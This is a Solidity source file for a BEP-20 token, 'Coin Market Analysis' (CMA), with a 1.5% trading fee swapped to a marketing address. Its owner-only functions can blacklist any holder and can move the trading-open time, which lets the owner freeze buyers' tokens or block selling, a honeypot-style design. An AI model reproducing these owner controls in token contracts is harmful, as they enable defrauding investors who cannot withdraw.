/**
 *Submitted for verification at BscScan.com on 2022-10-17
 */

pragma solidity 0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}

contract CMA is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    address public pair;
    bool public pairIsCreated = true;
    uint256 public numTokensSell = 5 * 10**18;

    address public marketAddress = 0x9eEE8769ff4c1AF472EBeecCe7F387a1b64F4bAA;

    IPancakeRouter02 internal uniswapV2Router =
        IPancakeRouter02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
    IERC20 private c_usdt = IERC20(0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee);

    mapping(address => bool) public isBlacklist;
    mapping(address => bool) public isExcludedFromFees;
    uint256 public tradingEnabledTimestamp;
    uint256 public blockNumTime = 6;

    constructor() public {
        address _pair = pairFor(
            uniswapV2Router.factory(),
            address(this),
            address(c_usdt)
        );
        pair = _pair;
        isExcludedFromFees[address(this)] = true;

        uint256 total = 10**23;
        _balances[msg.sender] = total;
        _totalSupply = total;
        emit Transfer(address(0), msg.sender, total);
    }

    function symbol() external pure returns (string memory) {
        return "CMA";
    }

    function name() external pure returns (string memory) {
        return "Coin Market Analysis";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        external
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _approve(sender, msg.sender, currentAllowance - amount);

        return true;
    }

    function _transferNormal(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _transferNoswap(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _transferNormal(sender, recipient, amount);
        if (!pairIsCreated) {
            return;
        }
        uint256 contractTokenBalance = _balances[address(this)];
        if (contractTokenBalance >= numTokensSell) {
            swapTokensForUSDT(contractTokenBalance);
        }
    }

    function swapTokensForUSDT(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(c_usdt);

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketAddress,
            block.timestamp
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(
            !isBlacklist[sender] && !isBlacklist[recipient],
            "in blacklist"
        );
        uint256 senderBalance = _balances[sender];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[sender] = senderBalance - amount;

        if (isExcludedFromFees[sender] || isExcludedFromFees[recipient]) {
            _transferNormal(sender, recipient, amount);
            return;
        }

        address _pair = pair;
        if (sender != _pair && recipient != _pair) {
            _transferNoswap(sender, recipient, amount);
            return;
        }

        require(block.timestamp >= tradingEnabledTimestamp, "trade not open");
        if (block.timestamp <= tradingEnabledTimestamp + blockNumTime) {
            if (sender != _pair && sender != address(uniswapV2Router)) {
                isBlacklist[sender] = true;
            }

            if (recipient != _pair && recipient != address(uniswapV2Router)) {
                isBlacklist[recipient] = true;
            }
        }

        uint256 fundAmount = (3 * amount) / 200;
        _balances[address(this)] += fundAmount;
        emit Transfer(sender, address(this), fundAmount);

        uint256 receiveAmount = amount - fundAmount;
        _balances[recipient] += receiveAmount;
        emit Transfer(sender, recipient, receiveAmount);
    }

    function pairFor(
        address factory,
        address tokenA,
        address tokenB
    ) internal pure returns (address pair_) {
        (address token0, address token1) = tokenA < tokenB
            ? (tokenA, tokenB)
            : (tokenB, tokenA);
        pair_ = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            factory,
                            keccak256(abi.encodePacked(token0, token1)),
                            hex"00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5"
                        )
                    )
                )
            )
        );
    }

    function setPair(address _pair) external onlyOwner {
        pair = _pair;
    }

    function setPairIsCreated(bool b) external onlyOwner {
        pairIsCreated = b;
    }

    function setN(uint256 n) external onlyOwner {
        numTokensSell = n;
    }

    function setTrade(uint256 t) external onlyOwner {
        tradingEnabledTimestamp = t;
    }

    function setBlockNumTime(uint256 b) external onlyOwner {
        blockNumTime = b;
    }

    function setExcludeFee(address a, bool b) external onlyOwner {
        isExcludedFromFees[a] = b;
    }

    function setBlacklist(address a, bool b) external onlyOwner {
        isBlacklist[a] = b;
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakePair {
    function token0() external view returns (address);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function sync() external;
}